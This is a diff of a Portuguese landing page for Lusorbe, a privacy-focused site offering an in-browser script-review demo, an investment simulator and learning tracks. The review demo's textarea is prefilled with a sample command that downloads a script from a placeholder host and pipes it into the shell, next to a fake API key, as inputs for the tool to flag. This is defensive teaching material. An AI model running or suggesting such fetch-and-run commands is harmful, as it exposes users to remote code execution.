@@ -9,7 +9,7 @@
     <meta name="referrer" content="no-referrer" />
     <!-- Preenchido no deploy (variável LUSORBE_API_URL). Vazio = formulário desligado. -->
     <meta name="lusorbe-api" content="" />
-    <meta name="description" content="Lusorbe — segurança defensiva, mercados e conhecimento num espaço com privacidade por definição." />
+    <meta name="description" content="Lusorbe — aprende a reconhecer scripts perigosos, simula o risco de investir e protege os teus dados. Privacidade por definição." />
     <meta property="og:title" content="Lusorbe — Luz que guarda" />
     <meta property="og:description" content="Segurança defensiva, mercados e conhecimento num espaço com privacidade por definição." />
     <meta property="og:type" content="website" />
@@ -34,7 +34,8 @@
           <li><a href="#defesa">Defesa</a></li>
           <li><a href="#mercados">Mercados</a></li>
           <li><a href="#educacao">Educação</a></li>
-          <li><a href="#privacidade">Privacidade</a></li>
+          <li><a href="#seguranca">Segurança</a></li>
+          <li><a href="#faq">Perguntas</a></li>
           <li><a href="#lista">Lista</a></li>
         </ul>
       </nav>
@@ -45,7 +46,9 @@
           <li><a href="#defesa">Defesa</a></li>
           <li><a href="#mercados">Mercados</a></li>
           <li><a href="#educacao">Educação</a></li>
-          <li><a href="#privacidade">Privacidade</a></li>
+          <li><a href="#seguranca">Segurança</a></li>
+          <li><a href="#estado">Estado do projeto</a></li>
+          <li><a href="#faq">Perguntas frequentes</a></li>
           <li><a href="#lista">Lista de espera</a></li>
           <li><a href="app/">Abrir espaço →</a></li>
         </ul>
@@ -53,57 +56,162 @@
     </header>
 
     <main id="main">
-      <section class="panel hero" data-accent="#5eead4" aria-labelledby="hero-title">
+      <section class="panel hero" data-orb="0" data-accent="#5eead4" aria-labelledby="hero-title">
         <div class="copy">
           <p class="kicker">Lusorbe · Missão 01</p>
           <h1 id="hero-title" class="display">Luz que<br />guarda.</h1>
-          <p class="lead">Segurança defensiva, mercados e conhecimento num só espaço. Com privacidade por definição.</p>
+          <p class="lead">Aprende a reconhecer scripts perigosos, a perceber o risco de um investimento e a proteger os teus dados. Num só espaço, com privacidade por definição.</p>
           <div class="actions">
             <a class="btn btn-solid" href="#lista">Entrar na lista</a>
-            <a class="btn btn-ghost" href="app/">Abrir espaço</a>
+            <a class="btn btn-ghost" href="#defesa">Experimentar já</a>
           </div>
-          <p class="hint" aria-hidden="true">Move o rato · arrasta para rodar · clica para pulsar</p>
+          <p class="hint" aria-hidden="true">Move o rato · arrasta para rodar a 4.ª dimensão · clica para pulsar</p>
         </div>
       </section>
 
-      <section class="panel right" id="defesa" data-accent="#38bdf8" aria-labelledby="defesa-title">
+      <section class="panel right" id="defesa" data-orb="1" data-accent="#38bdf8" aria-labelledby="defesa-title">
         <div class="copy">
           <p class="kicker">Missão 02 · Defesa</p>
           <h2 id="defesa-title" class="display">Vê o sinal<br />antes do impacto.</h2>
-          <p class="lead">Revê scripts e texto suspeito antes de os correr. Sem executar nada, sem vigiar ninguém, sem retaliar. Não substitui um antivírus.</p>
-          <ul class="specs">
-            <li><b>0</b><span>execuções</span></li>
-            <li><b>100%</b><span>revisão no teu browser</span></li>
-            <li><b>FIDO2</b><span>login com passkey</span></li>
-          </ul>
+          <p class="lead">Cola um comando ou script que encontraste na internet. A Lusorbe aponta os padrões perigosos e explica porquê, sem executar nada. Não substitui um antivírus.</p>
+          <form class="demo" id="demo-review" novalidate>
+            <label class="demo-label" for="review-input">Experimenta aqui · a análise corre no teu browser</label>
+            <textarea id="review-input" rows="4" spellcheck="false" maxlength="100000">curl -s https://exemplo.invalid/instalar.sh | sh
+api_key = "sk_test_0123456789abcdef"</textarea>
+            <div class="demo-actions">
+              <button class="btn btn-solid" type="submit">Analisar</button>
+              <a class="demo-link" href="app/#security">Continuar na app →</a>
+            </div>
+            <ul class="findings" id="review-out" aria-live="polite"></ul>
+          </form>
         </div>
       </section>
 
-      <section class="panel" id="mercados" data-accent="#a78bfa" aria-labelledby="mercados-title">
+      <section class="panel" id="mercados" data-orb="2" data-accent="#a78bfa" aria-labelledby="mercados-title">
         <div class="copy">
           <p class="kicker">Missão 03 · Mercados</p>
           <h2 id="mercados-title" class="display">Simula a trajetória.<br />Antes do risco.</h2>
-          <p class="lead">Cenários educativos para perceber risco, prazo e custo. Sem ordens reais e sem promessas de retorno.</p>
+          <p class="lead">Vê quanto as comissões comem a um ganho, ou quanto podes perder. Os valores são os que tu escreves: não há dados reais, ordens nem promessas de retorno.</p>
+          <form class="demo" id="demo-sim" novalidate>
+            <div class="sim-grid">
+              <label>Capital (€)<input name="capital" type="number" inputmode="decimal" min="1" step="any" value="1000" /></label>
+              <label>Preço de entrada<input name="entry" type="number" inputmode="decimal" min="0.0001" step="any" value="10" /></label>
+              <label>Preço de saída<input name="exit" type="number" inputmode="decimal" min="0" step="any" value="12" /></label>
+              <label>Custos por operação (%)<input name="fee" type="number" inputmode="decimal" min="0" max="99" step="any" value="0.5" /></label>
+            </div>
+            <output class="sim-out" id="sim-out" for="demo-sim" aria-live="polite"></output>
+            <div class="demo-actions">
+              <a class="demo-link" href="app/#markets">Continuar na app →</a>
+            </div>
+          </form>
         </div>
       </section>
 
-      <section class="panel right" id="educacao" data-accent="#fbbf24" aria-labelledby="educacao-title">
+      <section class="panel right" id="educacao" data-orb="3" data-accent="#fbbf24" aria-labelledby="educacao-title">
         <div class="copy">
           <p class="kicker">Missão 04 · Educação</p>
           <h2 id="educacao-title" class="display">Do 5.º ano<br />à faculdade.</h2>
-          <p class="lead">Percursos ao teu ritmo, literacia financeira desde cedo e um tutor que não cria perfis publicitários.</p>
+          <p class="lead">Percursos ao teu ritmo e um guia com respostas preparadas por tema. Sem inteligência artificial a inventar respostas e sem perfis publicitários.</p>
+          <ol class="tracks">
+            <li><b>5.º–7.º</b><span>Fundamentos e cidadania digital</span></li>
+            <li><b>7.º–9.º</b><span>Raciocínio, tecnologia e escolhas financeiras</span></li>
+            <li><b>9.º–12.º</b><span>Exames, projetos e literacia financeira</span></li>
+            <li><b>Faculdade</b><span>Competências profissionais e autonomia</span></li>
+          </ol>
+          <div class="demo-actions">
+            <a class="demo-link" href="app/#education">Ver os percursos na app →</a>
+          </div>
         </div>
       </section>
 
-      <section class="panel center" id="privacidade" data-accent="#f472b6" aria-labelledby="privacidade-title">
+      <div class="content-zone" data-orb="4">
+        <section class="content" id="como" data-accent="#5eead4" aria-labelledby="como-title">
+          <p class="kicker">Como funciona</p>
+          <h2 id="como-title" class="section-title">Três passos, nenhum segredo.</h2>
+          <ol class="steps">
+            <li><b>01</b><h3>Entra sem palavra-passe</h3><p>Com Google, Microsoft, GitHub ou uma chave de acesso (passkey) no teu telemóvel ou computador. Guardas códigos de recuperação para nunca ficares de fora.</p></li>
+            <li><b>02</b><h3>Usa as ferramentas</h3><p>Revê scripts, simula investimentos e segue percursos de aprendizagem. A revisão e o guia correm no teu browser.</p></li>
+            <li><b>03</b><h3>Decide tu</h3><p>A Lusorbe explica; não decide por ti, não executa nada e não te vende produtos financeiros.</p></li>
+          </ol>
+        </section>
+
+        <section class="content" id="seguranca" data-accent="#a78bfa" aria-labelledby="seguranca-title">
+          <p class="kicker">Segurança</p>
+          <h2 id="seguranca-title" class="section-title">O que está mesmo feito.</h2>
+          <p class="section-lead">Só listamos o que existe no código. O serviço ainda não está online; quando estiver, isto é o que o protege.</p>
+          <ul class="facts">
+            <li><h3>Passkeys (FIDO2)</h3><p>Login resistente a phishing. A chave privada nunca sai do teu dispositivo.</p></li>
+            <li><h3>Sessão protegida</h3><p>Cookie cifrado e inacessível a scripts. Sem tokens guardados no browser.</p></li>
+            <li><h3>Administração vigiada</h3><p>Administradores só entram com passkey. Dar acesso de administração exige a aprovação de uma segunda pessoa.</p></li>
+            <li><h3>Auditoria à prova de alterações</h3><p>Cada ação de administração fica registada, com o motivo, num registo encadeado que deteta edições.</p></li>
+            <li><h3>Limites contra abusos</h3><p>Tentativas de login e inscrições limitadas por endereço, para travar ataques de força bruta e spam.</p></li>
+            <li><h3>Esta página</h3><p>Sem cookies, sem analytics e sem pedidos a terceiros, com uma política de segurança (CSP) que o impede.</p></li>
+          </ul>
+        </section>
+
+        <section class="content" id="antivirus" data-accent="#38bdf8" aria-labelledby="antivirus-title">
+          <p class="kicker">Lusorbe e o teu antivírus</p>
+          <h2 id="antivirus-title" class="section-title">Complementa. Não substitui.</h2>
+          <div class="table-wrap">
+            <table class="compare">
+              <thead><tr><th scope="col"></th><th scope="col">Antivírus</th><th scope="col">Lusorbe</th></tr></thead>
+              <tbody>
+                <tr><th scope="row">Analisa ficheiros do computador</th><td class="y">Sim</td><td class="n">Não</td></tr>
+                <tr><th scope="row">Bloqueia ameaças em tempo real</th><td class="y">Sim</td><td class="n">Não</td></tr>
+                <tr><th scope="row">Explica porque um comando é perigoso</th><td class="n">Raramente</td><td class="y">Sim</td></tr>
+                <tr><th scope="row">Ensina a reconhecer burlas e riscos</th><td class="n">Não</td><td class="y">Sim</td></tr>
+                <tr><th scope="row">Analisa texto que colas antes de o correr</th><td class="n">Não</td><td class="y">Sim, no browser</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p class="section-lead">Mantém o antivírus do sistema (por exemplo, o Microsoft Defender) ligado e atualizado.</p>
+        </section>
+
+        <section class="content" id="estado" data-accent="#fbbf24" aria-labelledby="estado-title">
+          <p class="kicker">Estado do projeto</p>
+          <h2 id="estado-title" class="section-title">Onde estamos, sem exageros.</h2>
+          <ul class="roadmap">
+            <li><span class="tag done">Feito</span>Revisão de scripts no browser</li>
+            <li><span class="tag done">Feito</span>Simulador educativo de mercados</li>
+            <li><span class="tag done">Feito</span>Percursos de aprendizagem e guia</li>
+            <li><span class="tag done">Feito</span>Login com passkeys e códigos de recuperação</li>
+            <li><span class="tag done">Feito</span>Consola de administração com auditoria</li>
+            <li><span class="tag done">Feito</span>SDK oficial para programadores (TypeScript)</li>
+            <li><span class="tag wip">Em curso</span>Alojamento da API e abertura da lista de espera</li>
+            <li><span class="tag next">Planeado</span>Verificação de links suspeitos e cotações de mercado reais</li>
+          </ul>
+          <p class="section-lead">Sem data de lançamento anunciada. A lista de espera é a forma de saberes primeiro.</p>
+        </section>
+
+        <section class="content" id="faq" data-accent="#f472b6" aria-labelledby="faq-title">
+          <p class="kicker">Perguntas frequentes</p>
+          <h2 id="faq-title" class="section-title">Respostas diretas.</h2>
+          <div class="faq">
+            <details><summary>É gratuito?</summary><p>Sim, neste momento. Se vierem a existir planos pagos, o preço com IVA aparece antes de pagares e tens 14 dias para desistir. Ver os <a href="app/legal/terms.html#preco">Termos</a>.</p></details>
+            <details><summary>Substitui o antivírus?</summary><p>Não. A Lusorbe explica riscos em texto que colas; não analisa ficheiros nem bloqueia ameaças. Mantém o antivírus do sistema ligado.</p></details>
+            <details><summary>Usa inteligência artificial?</summary><p>Não. O guia usa respostas preparadas por tema e não envia as tuas perguntas para serviços externos.</p></details>
+            <details><summary>Os mercados usam dados reais?</summary><p>Não. O simulador usa os valores que escreves, não executa ordens e não é aconselhamento financeiro.</p></details>
+            <details><summary>O que fazem com o meu email da lista de espera?</summary><p>Usamo-lo só para avisar quando abrirmos. É apagado a teu pedido ou, no máximo, ao fim de 365 dias. Ver a <a href="app/legal/privacy.html#lista-de-espera">Política de Privacidade</a>.</p></details>
+            <details><summary>Crianças podem usar?</summary><p>Sim, com acompanhamento. Abaixo dos 13 anos é preciso autorização dos pais ou representantes legais.</p></details>
+            <details><summary>Quando abre?</summary><p>Ainda sem data. Entra na lista de espera para seres avisado uma única vez.</p></details>
+            <details><summary>Onde está o código?</summary><p>No <a href="https://github.com/TheDreamer888/ChristLives">GitHub</a>, onde podes ver como funciona.</p></details>
+          </div>
+        </section>
+      </div>
+
+      <section class="panel center" id="privacidade" data-orb="5" data-accent="#f472b6" aria-labelledby="privacidade-title">
         <div class="copy">
           <p class="kicker">Missão 05 · Privacidade</p>
           <h2 id="privacidade-title" class="display">O teu espaço.<br />Os teus dados.</h2>
           <p class="lead">Sem analytics publicitários, sem pixels, sem gravação de sessões. Esta página não usa cookies.</p>
+          <div class="actions">
+            <a class="btn btn-ghost" href="app/legal/privacy.html">Política de privacidade</a>
+            <a class="btn btn-ghost" href="app/legal/terms.html">Termos de serviço</a>
+          </div>
         </div>
       </section>
 
-      <section class="panel center waitlist" id="lista" data-accent="#5eead4" aria-labelledby="lista-title">
+      <section class="panel center waitlist" id="lista" data-orb="6" data-accent="#5eead4" aria-labelledby="lista-title">
         <div class="copy">
           <p class="kicker">Missão 06 · Lançamento</p>
           <h2 id="lista-title" class="display">Entra na lista.</h2>
